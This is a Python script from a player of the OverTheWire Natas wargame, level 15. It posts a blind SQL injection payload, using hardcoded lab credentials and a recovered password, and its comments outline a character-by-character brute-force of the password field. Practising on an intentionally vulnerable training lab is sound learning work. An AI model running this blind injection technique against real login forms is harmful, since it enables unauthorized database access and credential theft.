#!/bin/python3

import requests
import re
import html.parser

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "username" : 'natas16" AND password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"#',"submit":"Check existence" }
#files = { "uploadedfile" : open("phpinject13.php", "rb") } 
#cookie = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data,auth = (username,password) )

content = html.unescape(response.text)
#print (content)

if (re.search("This user exists",content)):
    print ("password found")
    print ("this script just confirms that the password works") 
    print ("sqlbruteforce15.php will run through how the password was retrieved")
else:
    print ("password not found")
    print ("check sqlinjection15.php for issues")
#print (re.findall('Successful login! The password for natas15 is (.*)<br>',content)[0]) 

#this one is interesting
#again sql injection but now the only result we get is 
#whether our query returned any results
#therefore we call pull the password out one character at a time
#if we ensure that the usernames returns true
#using natas 16 returns true 
#now we can construct a query that also checks against the password field 
#query = SELECT * from users where username = [username] 
#username = "natas16 and password = "variable password input" 
#we can test this by setting password = * to see if a result is returned 
#this returns true

#now we have to write a bruteforce script that will

#for each character in the password
#iterate through each possible character 
#check with the database to see if that is in the password
#if yes then move on to the next char
#if no keep going 
#until all the chars have been found

#looking at older passwords i can see that they can use
#all alpha-numerics including capitals
#this might take a while
